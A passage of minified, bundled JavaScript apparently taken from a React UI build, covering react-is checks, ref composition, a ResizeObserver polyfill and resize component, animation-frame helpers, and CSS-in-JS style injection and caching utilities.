      i !== null &&
      (i.$$typeof === q$1 ||
        i.$$typeof === p ||
        i.$$typeof === g$1 ||
        i.$$typeof === h$1 ||
        i.$$typeof === l ||
        i.$$typeof === u ||
        i.getModuleId !== void 0))
  );
};
reactIs_production_min.typeOf = v$2;
reactIs.exports = reactIs_production_min;
var reactIsExports = reactIs.exports;
function useMemo(i, a, o) {
  var s = reactExports.useRef({});
  return (
    (!("value" in s.current) || o(s.current.condition, a)) &&
      ((s.current.value = i()), (s.current.condition = a)),
    s.current.value
  );
}
var fillRef = function (a, o) {
    typeof a == "function"
      ? a(o)
      : _typeof(a) === "object" && a && "current" in a && (a.current = o);
  },
  composeRef = function () {
    for (var a = arguments.length, o = new Array(a), s = 0; s < a; s++)
      o[s] = arguments[s];
    var tt = o.filter(Boolean);
    return tt.length <= 1
      ? tt[0]
      : function (nt) {
          o.forEach(function (ot) {
            fillRef(ot, nt);
          });
        };
  },
  useComposeRef = function () {
    for (var a = arguments.length, o = new Array(a), s = 0; s < a; s++)
      o[s] = arguments[s];
    return useMemo(
      function () {
        return composeRef.apply(void 0, o);
      },
      o,
      function (tt, nt) {
        return (
          tt.length !== nt.length ||
          tt.every(function (ot, st) {
            return ot !== nt[st];
          })
        );
      }
    );
  },
  supportRef = function (a) {
    var o, s;
    if (!a) return !1;
    if (isReactElement(a) && a.props.propertyIsEnumerable("ref")) return !0;
    var tt = reactIsExports.isMemo(a) ? a.type.type : a.type;
    return !(
      (typeof tt == "function" &&
        !((o = tt.prototype) !== null && o !== void 0 && o.render) &&
        tt.$$typeof !== reactIsExports.ForwardRef) ||
      (typeof a == "function" &&
        !((s = a.prototype) !== null && s !== void 0 && s.render) &&
        a.$$typeof !== reactIsExports.ForwardRef)
    );
  };
function isReactElement(i) {
  return reactExports.isValidElement(i) && !isFragment$1(i);
}
var getNodeRef = function (a) {
    if (a && isReactElement(a)) {
      var o = a;
      return o.props.propertyIsEnumerable("ref") ? o.props.ref : o.ref;
    }
    return null;
  },
  CollectionContext = reactExports.createContext(null);
function Collection(i) {
  var a = i.children,
    o = i.onBatchResize,
    s = reactExports.useRef(0),
    tt = reactExports.useRef([]),
    nt = reactExports.useContext(CollectionContext),
    ot = reactExports.useCallback(
      function (st, ft, ht) {
        s.current += 1;
        var gt = s.current;
        tt.current.push({ size: st, element: ft, data: ht }),
          Promise.resolve().then(function () {
            gt === s.current && (o == null || o(tt.current), (tt.current = []));
          }),
          nt == null || nt(st, ft, ht);
      },
      [o, nt]
    );
  return reactExports.createElement(
    CollectionContext.Provider,
    { value: ot },
    a
  );
}
var MapShim = (function () {
    if (typeof Map < "u") return Map;
    function i(a, o) {
      var s = -1;
      return (
        a.some(function (tt, nt) {
          return tt[0] === o ? ((s = nt), !0) : !1;
        }),
        s
      );
    }
    return (function () {
      function a() {
        this.__entries__ = [];
      }
      return (
        Object.defineProperty(a.prototype, "size", {
          get: function () {
            return this.__entries__.length;
          },
          enumerable: !0,
          configurable: !0,
        }),
        (a.prototype.get = function (o) {
          var s = i(this.__entries__, o),
            tt = this.__entries__[s];
          return tt && tt[1];
        }),
        (a.prototype.set = function (o, s) {
          var tt = i(this.__entries__, o);
          ~tt ? (this.__entries__[tt][1] = s) : this.__entries__.push([o, s]);
        }),
        (a.prototype.delete = function (o) {
          var s = this.__entries__,
            tt = i(s, o);
          ~tt && s.splice(tt, 1);
        }),
        (a.prototype.has = function (o) {
          return !!~i(this.__entries__, o);
        }),
        (a.prototype.clear = function () {
          this.__entries__.splice(0);
        }),
        (a.prototype.forEach = function (o, s) {
          s === void 0 && (s = null);
          for (var tt = 0, nt = this.__entries__; tt < nt.length; tt++) {
            var ot = nt[tt];
            o.call(s, ot[1], ot[0]);
          }
        }),
        a
      );
    })();
  })(),
  isBrowser =
    typeof window < "u" &&
    typeof document < "u" &&
    window.document === document,
  global$1 = (function () {
    return typeof global < "u" && global.Math === Math
      ? global
      : typeof self < "u" && self.Math === Math
      ? self
      : typeof window < "u" && window.Math === Math
      ? window
      : Function("return this")();
  })(),
  requestAnimationFrame$1 = (function () {
    return typeof requestAnimationFrame == "function"
      ? requestAnimationFrame.bind(global$1)
      : function (i) {
          return setTimeout(function () {
            return i(Date.now());
          }, 1e3 / 60);
        };
  })(),
  trailingTimeout = 2;
function throttle(i, a) {
  var o = !1,
    s = !1,
    tt = 0;
  function nt() {
    o && ((o = !1), i()), s && st();
  }
  function ot() {
    requestAnimationFrame$1(nt);
  }
  function st() {
    var ft = Date.now();
    if (o) {
      if (ft - tt < trailingTimeout) return;
      s = !0;
    } else (o = !0), (s = !1), setTimeout(ot, a);
    tt = ft;
  }
  return st;
}
var REFRESH_DELAY = 20,
  transitionKeys = [
    "top",
    "right",
    "bottom",
    "left",
    "width",
    "height",
    "size",
    "weight",
  ],
  mutationObserverSupported = typeof MutationObserver < "u",
  ResizeObserverController = (function () {
    function i() {
      (this.connected_ = !1),
        (this.mutationEventsAdded_ = !1),
        (this.mutationsObserver_ = null),
        (this.observers_ = []),
        (this.onTransitionEnd_ = this.onTransitionEnd_.bind(this)),
        (this.refresh = throttle(this.refresh.bind(this), REFRESH_DELAY));
    }
    return (
      (i.prototype.addObserver = function (a) {
        ~this.observers_.indexOf(a) || this.observers_.push(a),
          this.connected_ || this.connect_();
      }),
      (i.prototype.removeObserver = function (a) {
        var o = this.observers_,
          s = o.indexOf(a);
        ~s && o.splice(s, 1),
          !o.length && this.connected_ && this.disconnect_();
      }),
      (i.prototype.refresh = function () {
        var a = this.updateObservers_();
        a && this.refresh();
      }),
      (i.prototype.updateObservers_ = function () {
        var a = this.observers_.filter(function (o) {
          return o.gatherActive(), o.hasActive();
        });
        return (
          a.forEach(function (o) {
            return o.broadcastActive();
          }),
          a.length > 0
        );
      }),
      (i.prototype.connect_ = function () {
        !isBrowser ||
          this.connected_ ||
          (document.addEventListener("transitionend", this.onTransitionEnd_),
          window.addEventListener("resize", this.refresh),
          mutationObserverSupported
            ? ((this.mutationsObserver_ = new MutationObserver(this.refresh)),
              this.mutationsObserver_.observe(document, {
                attributes: !0,
                childList: !0,
                characterData: !0,
                subtree: !0,
              }))
            : (document.addEventListener("DOMSubtreeModified", this.refresh),
              (this.mutationEventsAdded_ = !0)),
          (this.connected_ = !0));
      }),
      (i.prototype.disconnect_ = function () {
        !isBrowser ||
          !this.connected_ ||
          (document.removeEventListener("transitionend", this.onTransitionEnd_),
          window.removeEventListener("resize", this.refresh),
          this.mutationsObserver_ && this.mutationsObserver_.disconnect(),
          this.mutationEventsAdded_ &&
            document.removeEventListener("DOMSubtreeModified", this.refresh),
          (this.mutationsObserver_ = null),
          (this.mutationEventsAdded_ = !1),
          (this.connected_ = !1));
      }),
      (i.prototype.onTransitionEnd_ = function (a) {
        var o = a.propertyName,
          s = o === void 0 ? "" : o,
          tt = transitionKeys.some(function (nt) {
            return !!~s.indexOf(nt);
          });
        tt && this.refresh();
      }),
      (i.getInstance = function () {
        return this.instance_ || (this.instance_ = new i()), this.instance_;
      }),
      (i.instance_ = null),
      i
    );
  })(),
  defineConfigurable = function (i, a) {
    for (var o = 0, s = Object.keys(a); o < s.length; o++) {
      var tt = s[o];
      Object.defineProperty(i, tt, {
        value: a[tt],
        enumerable: !1,
        writable: !1,
        configurable: !0,
      });
    }
    return i;
  },
  getWindowOf = function (i) {
    var a = i && i.ownerDocument && i.ownerDocument.defaultView;
    return a || global$1;
  },
  emptyRect = createRectInit(0, 0, 0, 0);
function toFloat(i) {
  return parseFloat(i) || 0;
}
function getBordersSize(i) {
  for (var a = [], o = 1; o < arguments.length; o++) a[o - 1] = arguments[o];
  return a.reduce(function (s, tt) {
    var nt = i["border-" + tt + "-width"];
    return s + toFloat(nt);
  }, 0);
}
function getPaddings(i) {
  for (
    var a = ["top", "right", "bottom", "left"], o = {}, s = 0, tt = a;
    s < tt.length;
    s++
  ) {
    var nt = tt[s],
      ot = i["padding-" + nt];
    o[nt] = toFloat(ot);
  }
  return o;
}
function getSVGContentRect(i) {
  var a = i.getBBox();
  return createRectInit(0, 0, a.width, a.height);
}
function getHTMLElementContentRect(i) {
  var a = i.clientWidth,
    o = i.clientHeight;
  if (!a && !o) return emptyRect;
  var s = getWindowOf(i).getComputedStyle(i),
    tt = getPaddings(s),
    nt = tt.left + tt.right,
    ot = tt.top + tt.bottom,
    st = toFloat(s.width),
    ft = toFloat(s.height);
  if (
    (s.boxSizing === "border-box" &&
      (Math.round(st + nt) !== a &&
        (st -= getBordersSize(s, "left", "right") + nt),
      Math.round(ft + ot) !== o &&
        (ft -= getBordersSize(s, "top", "bottom") + ot)),
    !isDocumentElement(i))
  ) {
    var ht = Math.round(st + nt) - a,
      gt = Math.round(ft + ot) - o;
    Math.abs(ht) !== 1 && (st -= ht), Math.abs(gt) !== 1 && (ft -= gt);
  }
  return createRectInit(tt.left, tt.top, st, ft);
}
var isSVGGraphicsElement = (function () {
  return typeof SVGGraphicsElement < "u"
    ? function (i) {
        return i instanceof getWindowOf(i).SVGGraphicsElement;
      }
    : function (i) {
        return (
          i instanceof getWindowOf(i).SVGElement &&
          typeof i.getBBox == "function"
        );
      };
})();
function isDocumentElement(i) {
  return i === getWindowOf(i).document.documentElement;
}
function getContentRect(i) {
  return isBrowser
    ? isSVGGraphicsElement(i)
      ? getSVGContentRect(i)
      : getHTMLElementContentRect(i)
    : emptyRect;
}
function createReadOnlyRect(i) {
  var a = i.x,
    o = i.y,
    s = i.width,
    tt = i.height,
    nt = typeof DOMRectReadOnly < "u" ? DOMRectReadOnly : Object,
    ot = Object.create(nt.prototype);
  return (
    defineConfigurable(ot, {
      x: a,
      y: o,
      width: s,
      height: tt,
      top: o,
      right: a + s,
      bottom: tt + o,
      left: a,
    }),
    ot
  );
}
function createRectInit(i, a, o, s) {
  return { x: i, y: a, width: o, height: s };
}
var ResizeObservation = (function () {
    function i(a) {
      (this.broadcastWidth = 0),
        (this.broadcastHeight = 0),
        (this.contentRect_ = createRectInit(0, 0, 0, 0)),
        (this.target = a);
    }
    return (
      (i.prototype.isActive = function () {
        var a = getContentRect(this.target);
        return (
          (this.contentRect_ = a),
          a.width !== this.broadcastWidth || a.height !== this.broadcastHeight
        );
      }),
      (i.prototype.broadcastRect = function () {
        var a = this.contentRect_;
        return (
          (this.broadcastWidth = a.width), (this.broadcastHeight = a.height), a
        );
      }),
      i
    );
  })(),
  ResizeObserverEntry = (function () {
    function i(a, o) {
      var s = createReadOnlyRect(o);
      defineConfigurable(this, { target: a, contentRect: s });
    }
    return i;
  })(),
  ResizeObserverSPI = (function () {
    function i(a, o, s) {
      if (
        ((this.activeObservations_ = []),
        (this.observations_ = new MapShim()),
        typeof a != "function")
      )
        throw new TypeError(
          "The callback provided as parameter 1 is not a function."
        );
      (this.callback_ = a), (this.controller_ = o), (this.callbackCtx_ = s);
    }
    return (
      (i.prototype.observe = function (a) {
        if (!arguments.length)
          throw new TypeError("1 argument required, but only 0 present.");
        if (!(typeof Element > "u" || !(Element instanceof Object))) {
          if (!(a instanceof getWindowOf(a).Element))
            throw new TypeError('parameter 1 is not of type "Element".');
          var o = this.observations_;
          o.has(a) ||
            (o.set(a, new ResizeObservation(a)),
            this.controller_.addObserver(this),
            this.controller_.refresh());
        }
      }),
      (i.prototype.unobserve = function (a) {
        if (!arguments.length)
          throw new TypeError("1 argument required, but only 0 present.");
        if (!(typeof Element > "u" || !(Element instanceof Object))) {
          if (!(a instanceof getWindowOf(a).Element))
            throw new TypeError('parameter 1 is not of type "Element".');
          var o = this.observations_;
          o.has(a) &&
            (o.delete(a), o.size || this.controller_.removeObserver(this));
        }
      }),
      (i.prototype.disconnect = function () {
        this.clearActive(),
          this.observations_.clear(),
          this.controller_.removeObserver(this);
      }),
      (i.prototype.gatherActive = function () {
        var a = this;
        this.clearActive(),
          this.observations_.forEach(function (o) {
            o.isActive() && a.activeObservations_.push(o);
          });
      }),
      (i.prototype.broadcastActive = function () {
        if (this.hasActive()) {
          var a = this.callbackCtx_,
            o = this.activeObservations_.map(function (s) {
              return new ResizeObserverEntry(s.target, s.broadcastRect());
            });
          this.callback_.call(a, o, a), this.clearActive();
        }
      }),
      (i.prototype.clearActive = function () {
        this.activeObservations_.splice(0);
      }),
      (i.prototype.hasActive = function () {
        return this.activeObservations_.length > 0;
      }),
      i
    );
  })(),
  observers = typeof WeakMap < "u" ? new WeakMap() : new MapShim(),
  ResizeObserver$2 = (function () {
    function i(a) {
      if (!(this instanceof i))
        throw new TypeError("Cannot call a class as a function.");
      if (!arguments.length)
        throw new TypeError("1 argument required, but only 0 present.");
      var o = ResizeObserverController.getInstance(),
        s = new ResizeObserverSPI(a, o, this);
      observers.set(this, s);
    }
    return i;
  })();
["observe", "unobserve", "disconnect"].forEach(function (i) {
  ResizeObserver$2.prototype[i] = function () {
    var a;
    return (a = observers.get(this))[i].apply(a, arguments);
  };
});
var index = (function () {
    return typeof global$1.ResizeObserver < "u"
      ? global$1.ResizeObserver
      : ResizeObserver$2;
  })(),
  elementListeners = new Map();
function onResize(i) {
  i.forEach(function (a) {
    var o,
      s = a.target;
    (o = elementListeners.get(s)) === null ||
      o === void 0 ||
      o.forEach(function (tt) {
        return tt(s);
      });
  });
}
var resizeObserver = new index(onResize);
function observe(i, a) {
  elementListeners.has(i) ||
    (elementListeners.set(i, new Set()), resizeObserver.observe(i)),
    elementListeners.get(i).add(a);
}
function unobserve(i, a) {
  elementListeners.has(i) &&
    (elementListeners.get(i).delete(a),
    elementListeners.get(i).size ||
      (resizeObserver.unobserve(i), elementListeners.delete(i)));
}
function _classCallCheck(i, a) {
  if (!(i instanceof a))
    throw new TypeError("Cannot call a class as a function");
}
function _defineProperties(i, a) {
  for (var o = 0; o < a.length; o++) {
    var s = a[o];
    (s.enumerable = s.enumerable || !1),
      (s.configurable = !0),
      "value" in s && (s.writable = !0),
      Object.defineProperty(i, toPropertyKey(s.key), s);
  }
}
function _createClass(i, a, o) {
  return (
    a && _defineProperties(i.prototype, a),
    o && _defineProperties(i, o),
    Object.defineProperty(i, "prototype", { writable: !1 }),
    i
  );
}
function _setPrototypeOf(i, a) {
  return (
    (_setPrototypeOf = Object.setPrototypeOf
      ? Object.setPrototypeOf.bind()
      : function (o, s) {
          return (o.__proto__ = s), o;
        }),
    _setPrototypeOf(i, a)
  );
}
function _inherits(i, a) {
  if (typeof a != "function" && a !== null)
    throw new TypeError("Super expression must either be null or a function");
  (i.prototype = Object.create(a && a.prototype, {
    constructor: { value: i, writable: !0, configurable: !0 },
  })),
    Object.defineProperty(i, "prototype", { writable: !1 }),
    a && _setPrototypeOf(i, a);
}
function _getPrototypeOf(i) {
  return (
    (_getPrototypeOf = Object.setPrototypeOf
      ? Object.getPrototypeOf.bind()
      : function (a) {
          return a.__proto__ || Object.getPrototypeOf(a);
        }),
    _getPrototypeOf(i)
  );
}
function _isNativeReflectConstruct() {
  try {
    var i = !Boolean.prototype.valueOf.call(
      Reflect.construct(Boolean, [], function () {})
    );
  } catch {}
  return (_isNativeReflectConstruct = function () {
    return !!i;
  })();
}
function _assertThisInitialized(i) {
  if (i === void 0)
    throw new ReferenceError(
      "this hasn't been initialised - super() hasn't been called"
    );
  return i;
}
function _possibleConstructorReturn(i, a) {
  if (a && (_typeof(a) == "object" || typeof a == "function")) return a;
  if (a !== void 0)
    throw new TypeError(
      "Derived constructors may only return object or undefined"
    );
  return _assertThisInitialized(i);
}
function _createSuper(i) {
  var a = _isNativeReflectConstruct();
  return function () {
    var o,
      s = _getPrototypeOf(i);
    if (a) {
      var tt = _getPrototypeOf(this).constructor;
      o = Reflect.construct(s, arguments, tt);
    } else o = s.apply(this, arguments);
    return _possibleConstructorReturn(this, o);
  };
}
var DomWrapper$1 = (function (i) {
  _inherits(o, i);
  var a = _createSuper(o);
  function o() {
    return _classCallCheck(this, o), a.apply(this, arguments);
  }
  return (
    _createClass(o, [
      {
        key: "render",
        value: function () {
          return this.props.children;
        },
      },
    ]),
    o
  );
})(reactExports.Component);
function SingleObserver(i, a) {
  var o = i.children,
    s = i.disabled,
    tt = reactExports.useRef(null),
    nt = reactExports.useRef(null),
    ot = reactExports.useContext(CollectionContext),
    st = typeof o == "function",
    ft = st ? o(tt) : o,
    ht = reactExports.useRef({
      width: -1,
      height: -1,
      offsetWidth: -1,
      offsetHeight: -1,
    }),
    gt = !st && reactExports.isValidElement(ft) && supportRef(ft),
    St = gt ? getNodeRef(ft) : null,
    vt = useComposeRef(St, tt),
    _t = function () {
      var bt;
      return (
        findDOMNode(tt.current) ||
        (tt.current && _typeof(tt.current) === "object"
          ? findDOMNode(
              (bt = tt.current) === null || bt === void 0
                ? void 0
                : bt.nativeElement
            )
          : null) ||
        findDOMNode(nt.current)
      );
    };
  reactExports.useImperativeHandle(a, function () {
    return _t();
  });
  var Et = reactExports.useRef(i);
  Et.current = i;
  var Ct = reactExports.useCallback(function (Pt) {
    var bt = Et.current,
      xt = bt.onResize,
      yt = bt.data,
      wt = Pt.getBoundingClientRect(),
      $t = wt.width,
      kt = wt.height,
      Rt = Pt.offsetWidth,
      It = Pt.offsetHeight,
      Ot = Math.floor($t),
      Nt = Math.floor(kt);
    if (
      ht.current.width !== Ot ||
      ht.current.height !== Nt ||
      ht.current.offsetWidth !== Rt ||
      ht.current.offsetHeight !== It
    ) {
      var zt = { width: Ot, height: Nt, offsetWidth: Rt, offsetHeight: It };
      ht.current = zt;
      var Bt = Rt === Math.round($t) ? $t : Rt,
        Wt = It === Math.round(kt) ? kt : It,
        Gt = _objectSpread2$1(
          _objectSpread2$1({}, zt),
          {},
          { offsetWidth: Bt, offsetHeight: Wt }
        );
      ot == null || ot(Gt, Pt, yt),
        xt &&
          Promise.resolve().then(function () {
            xt(Gt, Pt);
          });
    }
  }, []);
  return (
    reactExports.useEffect(
      function () {
        var Pt = _t();
        return (
          Pt && !s && observe(Pt, Ct),
          function () {
            return unobserve(Pt, Ct);
          }
        );
      },
      [tt.current, s]
    ),
    reactExports.createElement(
      DomWrapper$1,
      { ref: nt },
      gt ? reactExports.cloneElement(ft, { ref: vt }) : ft
    )
  );
}
var RefSingleObserver = reactExports.forwardRef(SingleObserver),
  INTERNAL_PREFIX_KEY = "rc-observer-key";
function ResizeObserver$1(i, a) {
  var o = i.children,
    s = typeof o == "function" ? [o] : toArray$2(o);
  return s.map(function (tt, nt) {
    var ot =
      (tt == null ? void 0 : tt.key) ||
      "".concat(INTERNAL_PREFIX_KEY, "-").concat(nt);
    return reactExports.createElement(
      RefSingleObserver,
      _extends({}, i, { key: ot, ref: nt === 0 ? a : void 0 }),
      tt
    );
  });
}
var RefResizeObserver = reactExports.forwardRef(ResizeObserver$1);
RefResizeObserver.Collection = Collection;
function omit(i, a) {
  var o = Object.assign({}, i);
  return (
    Array.isArray(a) &&
      a.forEach(function (s) {
        delete o[s];
      }),
    o
  );
}
function _arrayLikeToArray$1(i, a) {
  (a == null || a > i.length) && (a = i.length);
  for (var o = 0, s = Array(a); o < a; o++) s[o] = i[o];
  return s;
}
function _arrayWithoutHoles(i) {
  if (Array.isArray(i)) return _arrayLikeToArray$1(i);
}
function _iterableToArray(i) {
  if (
    (typeof Symbol < "u" && i[Symbol.iterator] != null) ||
    i["@@iterator"] != null
  )
    return Array.from(i);
}
function _unsupportedIterableToArray$1(i, a) {
  if (i) {
    if (typeof i == "string") return _arrayLikeToArray$1(i, a);
    var o = {}.toString.call(i).slice(8, -1);
    return (
      o === "Object" && i.constructor && (o = i.constructor.name),
      o === "Map" || o === "Set"
        ? Array.from(i)
        : o === "Arguments" ||
          /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(o)
        ? _arrayLikeToArray$1(i, a)
        : void 0
    );
  }
}
function _nonIterableSpread() {
  throw new TypeError(`Invalid attempt to spread non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`);
}
function _toConsumableArray(i) {
  return (
    _arrayWithoutHoles(i) ||
    _iterableToArray(i) ||
    _unsupportedIterableToArray$1(i) ||
    _nonIterableSpread()
  );
}
var raf = function (a) {
    return +setTimeout(a, 16);
  },
  caf = function (a) {
    return clearTimeout(a);
  };
typeof window < "u" &&
  "requestAnimationFrame" in window &&
  ((raf = function (a) {
    return window.requestAnimationFrame(a);
  }),
  (caf = function (a) {
    return window.cancelAnimationFrame(a);
  }));
var rafUUID = 0,
  rafIds = new Map();
function cleanup(i) {
  rafIds.delete(i);
}
var wrapperRaf = function (a) {
  var o = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 1;
  rafUUID += 1;
  var s = rafUUID;
  function tt(nt) {
    if (nt === 0) cleanup(s), a();
    else {
      var ot = raf(function () {
        tt(nt - 1);
      });
      rafIds.set(s, ot);
    }
  }
  return tt(o), s;
};
wrapperRaf.cancel = function (i) {
  var a = rafIds.get(i);
  return cleanup(i), caf(a);
};
function _arrayWithHoles$1(i) {
  if (Array.isArray(i)) return i;
}
function _iterableToArrayLimit$1(i, a) {
  var o =
    i == null
      ? null
      : (typeof Symbol < "u" && i[Symbol.iterator]) || i["@@iterator"];
  if (o != null) {
    var s,
      tt,
      nt,
      ot,
      st = [],
      ft = !0,
      ht = !1;
    try {
      if (((nt = (o = o.call(i)).next), a === 0)) {
        if (Object(o) !== o) return;
        ft = !1;
      } else
        for (
          ;
          !(ft = (s = nt.call(o)).done) && (st.push(s.value), st.length !== a);
          ft = !0
        );
    } catch (gt) {
      (ht = !0), (tt = gt);
    } finally {
      try {
        if (!ft && o.return != null && ((ot = o.return()), Object(ot) !== ot))
          return;
      } finally {
        if (ht) throw tt;
      }
    }
    return st;
  }
}
function _nonIterableRest$1() {
  throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`);
}
function _slicedToArray$1(i, a) {
  return (
    _arrayWithHoles$1(i) ||
    _iterableToArrayLimit$1(i, a) ||
    _unsupportedIterableToArray$1(i, a) ||
    _nonIterableRest$1()
  );
}
function murmur2(i) {
  for (var a = 0, o, s = 0, tt = i.length; tt >= 4; ++s, tt -= 4)
    (o =
      (i.charCodeAt(s) & 255) |
      ((i.charCodeAt(++s) & 255) << 8) |
      ((i.charCodeAt(++s) & 255) << 16) |
      ((i.charCodeAt(++s) & 255) << 24)),
      (o = (o & 65535) * 1540483477 + (((o >>> 16) * 59797) << 16)),
      (o ^= o >>> 24),
      (a =
        ((o & 65535) * 1540483477 + (((o >>> 16) * 59797) << 16)) ^
        ((a & 65535) * 1540483477 + (((a >>> 16) * 59797) << 16)));
  switch (tt) {
    case 3:
      a ^= (i.charCodeAt(s + 2) & 255) << 16;
    case 2:
      a ^= (i.charCodeAt(s + 1) & 255) << 8;
    case 1:
      (a ^= i.charCodeAt(s) & 255),
        (a = (a & 65535) * 1540483477 + (((a >>> 16) * 59797) << 16));
  }
  return (
    (a ^= a >>> 13),
    (a = (a & 65535) * 1540483477 + (((a >>> 16) * 59797) << 16)),
    ((a ^ (a >>> 15)) >>> 0).toString(36)
  );
}
function canUseDom() {
  return !!(
    typeof window < "u" &&
    window.document &&
    window.document.createElement
  );
}
function contains(i, a) {
  if (!i) return !1;
  if (i.contains) return i.contains(a);
  for (var o = a; o; ) {
    if (o === i) return !0;
    o = o.parentNode;
  }
  return !1;
}
var APPEND_ORDER = "data-rc-order",
  APPEND_PRIORITY = "data-rc-priority",
  MARK_KEY = "rc-util-key",
  containerCache = new Map();
function getMark() {
  var i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {},
    a = i.mark;
  return a ? (a.startsWith("data-") ? a : "data-".concat(a)) : MARK_KEY;
}
function getContainer(i) {
  if (i.attachTo) return i.attachTo;
  var a = document.querySelector("head");
  return a || document.body;
}
function getOrder(i) {
  return i === "queue" ? "prependQueue" : i ? "prepend" : "append";
}
function findStyles(i) {
  return Array.from((containerCache.get(i) || i).children).filter(function (a) {
    return a.tagName === "STYLE";
  });
}
function injectCSS(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
  if (!canUseDom()) return null;
  var o = a.csp,
    s = a.prepend,
    tt = a.priority,
    nt = tt === void 0 ? 0 : tt,
    ot = getOrder(s),
    st = ot === "prependQueue",
    ft = document.createElement("style");
  ft.setAttribute(APPEND_ORDER, ot),
    st && nt && ft.setAttribute(APPEND_PRIORITY, "".concat(nt)),
    o != null && o.nonce && (ft.nonce = o == null ? void 0 : o.nonce),
    (ft.innerHTML = i);
  var ht = getContainer(a),
    gt = ht.firstChild;
  if (s) {
    if (st) {
      var St = (a.styles || findStyles(ht)).filter(function (vt) {
        if (
          !["prepend", "prependQueue"].includes(vt.getAttribute(APPEND_ORDER))
        )
          return !1;
        var _t = Number(vt.getAttribute(APPEND_PRIORITY) || 0);
        return nt >= _t;
      });
      if (St.length)
        return ht.insertBefore(ft, St[St.length - 1].nextSibling), ft;
    }
    ht.insertBefore(ft, gt);
  } else ht.appendChild(ft);
  return ft;
}
function findExistNode(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {},
    o = getContainer(a);
  return (a.styles || findStyles(o)).find(function (s) {
    return s.getAttribute(getMark(a)) === i;
  });
}
function removeCSS(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {},
    o = findExistNode(i, a);
  if (o) {
    var s = getContainer(a);
    s.removeChild(o);
  }
}
function syncRealContainer(i, a) {
  var o = containerCache.get(i);
  if (!o || !contains(document, o)) {
    var s = injectCSS("", a),
      tt = s.parentNode;
    containerCache.set(i, tt), i.removeChild(s);
  }
}
function updateCSS(i, a) {
  var o = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {},
    s = getContainer(o),
    tt = findStyles(s),
    nt = _objectSpread2$1(_objectSpread2$1({}, o), {}, { styles: tt });
  syncRealContainer(s, nt);
  var ot = findExistNode(a, nt);
  if (ot) {
    var st, ft;
    if (
      (st = nt.csp) !== null &&
      st !== void 0 &&
      st.nonce &&
      ot.nonce !== ((ft = nt.csp) === null || ft === void 0 ? void 0 : ft.nonce)
    ) {
      var ht;
      ot.nonce = (ht = nt.csp) === null || ht === void 0 ? void 0 : ht.nonce;
    }
    return ot.innerHTML !== i && (ot.innerHTML = i), ot;
  }
  var gt = injectCSS(i, nt);
  return gt.setAttribute(getMark(nt), a), gt;
}
function _objectWithoutPropertiesLoose$1(i, a) {
  if (i == null) return {};
  var o = {};
  for (var s in i)
    if ({}.hasOwnProperty.call(i, s)) {
      if (a.includes(s)) continue;
      o[s] = i[s];
    }
  return o;
}
function _objectWithoutProperties$1(i, a) {
  if (i == null) return {};
  var o,
    s,
    tt = _objectWithoutPropertiesLoose$1(i, a);
  if (Object.getOwnPropertySymbols) {
    var nt = Object.getOwnPropertySymbols(i);
    for (s = 0; s < nt.length; s++)
      (o = nt[s]),
        a.includes(o) || ({}.propertyIsEnumerable.call(i, o) && (tt[o] = i[o]));
  }
  return tt;
}
function isEqual(i, a) {
  var o = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : !1,
    s = new Set();
  function tt(nt, ot) {
    var st = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : 1,
      ft = s.has(nt);
    if ((warningOnce(!ft, "Warning: There may be circular references"), ft))
      return !1;
    if (nt === ot) return !0;
    if (o && st > 1) return !1;
    s.add(nt);
    var ht = st + 1;
    if (Array.isArray(nt)) {
      if (!Array.isArray(ot) || nt.length !== ot.length) return !1;
      for (var gt = 0; gt < nt.length; gt++)
        if (!tt(nt[gt], ot[gt], ht)) return !1;
      return !0;
    }
    if (nt && ot && _typeof(nt) === "object" && _typeof(ot) === "object") {
      var St = Object.keys(nt);
      return St.length !== Object.keys(ot).length
        ? !1
        : St.every(function (vt) {
            return tt(nt[vt], ot[vt], ht);
          });
    }
    return !1;
  }
  return tt(i, a);
}
var SPLIT$1 = "%";
function pathKey(i) {
  return i.join(SPLIT$1);
}
var Entity = (function () {
    function i(a) {
      _classCallCheck(this, i),
        _defineProperty$1(this, "instanceId", void 0),
        _defineProperty$1(this, "cache", new Map()),
        (this.instanceId = a);
    }
    return (
      _createClass(i, [
        {
          key: "get",
          value: function (o) {
            return this.opGet(pathKey(o));
          },
        },
        {
          key: "opGet",
          value: function (o) {
            return this.cache.get(o) || null;
          },
        },
        {
          key: "update",
          value: function (o, s) {
            return this.opUpdate(pathKey(o), s);
          },
        },
        {
          key: "opUpdate",
          value: function (o, s) {
            var tt = this.cache.get(o),
              nt = s(tt);
            nt === null ? this.cache.delete(o) : this.cache.set(o, nt);
          },
        },
      ]),
      i
    );
  })(),
  ATTR_TOKEN = "data-token-hash",
  ATTR_MARK = "data-css-hash",
  CSS_IN_JS_INSTANCE = "__cssinjs_instance__";
function createCache() {
  var i = Math.random().toString(12).slice(2);
  if (typeof document < "u" && document.head && document.body) {
    var a =
        document.body.querySelectorAll("style[".concat(ATTR_MARK, "]")) || [],
      o = document.head.firstChild;
    Array.from(a).forEach(function (tt) {
      (tt[CSS_IN_JS_INSTANCE] = tt[CSS_IN_JS_INSTANCE] || i),
        tt[CSS_IN_JS_INSTANCE] === i && document.head.insertBefore(tt, o);
    });
    var s = {};
    Array.from(
      document.querySelectorAll("style[".concat(ATTR_MARK, "]"))
    ).forEach(function (tt) {
      var nt = tt.getAttribute(ATTR_MARK);
      if (s[nt]) {
        if (tt[CSS_IN_JS_INSTANCE] === i) {
          var ot;
          (ot = tt.parentNode) === null || ot === void 0 || ot.removeChild(tt);
        }
      } else s[nt] = !0;
    });
  }
  return new Entity(i);
}
var StyleContext = reactExports.createContext({
  hashPriority: "low",
  cache: createCache(),
  defaultCache: !0,
});
function sameDerivativeOption(i, a) {
  if (i.length !== a.length) return !1;
  for (var o = 0; o < i.length; o++) if (i[o] !== a[o]) return !1;
  return !0;
}
